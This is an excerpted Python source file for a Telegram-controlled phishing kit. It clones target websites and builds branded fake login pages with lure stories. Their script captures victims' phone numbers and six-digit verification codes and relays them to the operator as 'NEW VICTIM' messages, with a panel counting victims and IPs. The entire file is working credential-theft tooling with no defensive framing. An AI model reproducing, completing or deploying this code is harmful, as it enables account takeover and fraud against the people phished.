...
<body>
    <h1>PANEL | {{ domain }}</h1>
    <div class="stats">
        <div class="stat"><div class="num">{{ logs|length }}</div>victims</div>
        <div class="stat"><div class="num">{{ ips|length }}</div>unique IP</div>
    </div>
    {% if logs %}
...
def submit_data(phish_id):
    ...
    try:
        text = "NEW VICTIM | " + phish.get('domain','?') + "\n\n"
        for k, v in data.items():
            if k != 'user_agent':
                text += "<b>" + k + "</b>: <code>" + str(v) + "</code>\n"
...
class SiteCloner:
    def __init__(self, target_url, task_id, chat_id):
        ...
        self.output_dir = "/tmp/clones/" + task_id
        self.domain = urlparse(target_url).netloc
        self.assets = 0
        
        os.makedirs(self.output_dir, exist_ok=True)
        for f in ['css', 'js', 'img', 'fonts']:
            os.makedirs(self.output_dir + "/" + f, exist_ok=True)
    ...
    def download(self, url, folder):
        try:
            ...
            if not name or len(name) < 3:
                name = "f_" + str(hash(url) % 10000)
            if '.' not in name:
                name += '.css' if 'css' in url else '.js' if 'js' in url else '.png'
            
            path = self.output_dir + "/" + folder + "/" + name
    ...
    def clone(self):
        bot.send_message(self.chat_id, "Cloning " + self.domain + "...")
        ...
        with open(self.output_dir + '/index.html', 'w', encoding='utf-8') as f:
            ...
            f.write('<title>' + self.domain + '</title>\n')
            for t in soup.find_all('link', href=True):
                f.write(str(t) + '\n')
            f.write('</head>\n<body>\n')
            body_content = soup.find('body')
            f.write(str(body_content) if body_content else str(soup))
            f.write('\n</body>\n</html>')
        
        return {'dir': self.output_dir, 'assets': self.assets}

# ========== PHANTOM BUILDER ==========
def get_phantom_html(phish_id, brand_name, primary_color, local_logo, story_title, story_body, story_button, target_url):
    logo_html = '<img src="' + local_logo + '" alt="' + brand_name + '">' if local_logo else brand_name
...
<body>
        ...
        <div class="card">
            ...
            <form id="loginForm">
                ...
                <div class="input-group" id="codeGroup" style="display:none;">
                    ...
                    <input type="text" name="code" placeholder="Enter code" maxlength="6" inputmode="numeric">
                </div>
                <button type="submit" class="btn" id="submitBtn">""" + story_button + """</button>
            </form>
    ...
    <script>
        ...
        var step = 1;
        var phishId = '""" + phish_id + """';
        var redirectUrl = '""" + target_url + """';
        ...
        form.addEventListener('submit', function(e) {
            ...
            if (step === 1) {
                ...
                fetch('/submit/' + phishId, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                    body: 'phone=' + phone + '&step=1'
                });
                ...
                fetch('/submit/' + phishId, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                    body: 'phone=' + phoneInput.value.replace(/[^0-9]/g,'') + '&code=' + code + '&step=2'
                });
...
class PhantomBuilder:
    STORIES = {
        'photo': {'title': 'Someone shared a photo with you', 'body': 'Log in to view the image.', 'button': 'Continue'},
    ...
    def __init__(self, target_url, task_id, chat_id):
        ...
        self.output_dir = "/tmp/phantom/" + self.phish_id
        self.domain = urlparse(target_url).netloc
    ...
    def build(self):
        bot.send_message(self.chat_id, "Building phantom for " + self.domain + "...")
        ...
        if brand['logo']:
            try:
                ...
                if r.status_code == 200:
                    ...
                    with open(self.output_dir + "/assets/logo" + ext, 'wb') as f:
                        f.write(r.content)
                    local_logo = "assets/logo" + ext
            except:
                pass
        
        html = get_phantom_html(
            self.phish_id,
            brand['brand'],
            brand['primary'],
            local_logo,
...
/clone URL - exact copy
/phantom URL - phishing landing
/panel ID - victim logs
/logs ID - logs in Telegram
/list - all sites
/get ID - download ZIP
""")
...
def clone_cmd(message):
    ...
    msg = bot.reply_to(message, "Cloning " + url + "...")
    
    def process():
        cloner = SiteCloner(url, tid, message.chat.id)
        result = cloner.clone()
        if result:
            zip_path = "/tmp/clones/" + tid + ".zip"
            shutil.make_archive("/tmp/clones/" + tid, 'zip', result['dir'])
            ACTIVE_TASKS[tid].update({'status': 'done', 'file': zip_path, 'assets': result['assets']})
            bot.edit_message_text("DONE! Assets: " + str(result['assets']) + "\n/get " + tid, message.chat.id, msg.message_id)
        else:
...
def phantom_cmd(message):
    ...
    msg = bot.reply_to(message, "Creating phantom for " + url + "...")
    ...
    def process():
        ...
        if result:
            ...
            phish_url = server_url + "/phantom/" + result['phish_id']
            panel_url = server_url + "/panel/" + result['phish_id']
            zip_path = "/tmp/phantom/" + result['phish_id'] + ".zip"
            shutil.make_archive("/tmp/phantom/" + result['phish_id'], 'zip', result['dir'])
...
def get_cmd(message):
    ...
    if not task or task.get('status') != 'done':
        bot.reply_to(message, "Not ready")
        return
    path = task.get('file')
    ...
    with open(path, 'rb') as f:
        bot.send_document(message.chat.id, f, visible_file_name=task.get('type','file') + "_" + tid + ".zip")
...
def list_cmd(message):
    ...
    if PHISH_SITES:
        for pid, p in PHISH_SITES.items():
            text += pid + " | " + p.get('type','?') + "\n"
            text += "Target: " + p.get('domain','?') + "\n"
            text += "Victims: " + str(len(p.get('logs',[]))) + "\n"
            text += "/panel " + pid + "\n\n"
    else:
        text += "None active\n"
...
def panel_cmd(message):
    ...
    if len(args) < 2:
        ...
        return
    bot.reply_to(message, get_server_url() + "/panel/" + args[1])
...
def serve_phantom(phish_id):
    path = '/tmp/phantom/' + phish_id + '/index.html'
...
def serve_phantom_assets(phish_id, filename):
    path = '/tmp/phantom/' + phish_id + '/' + filename
    if os.path.exists(path):
        mime = 'text/css' if filename.endswith('.css') else 'image/png'
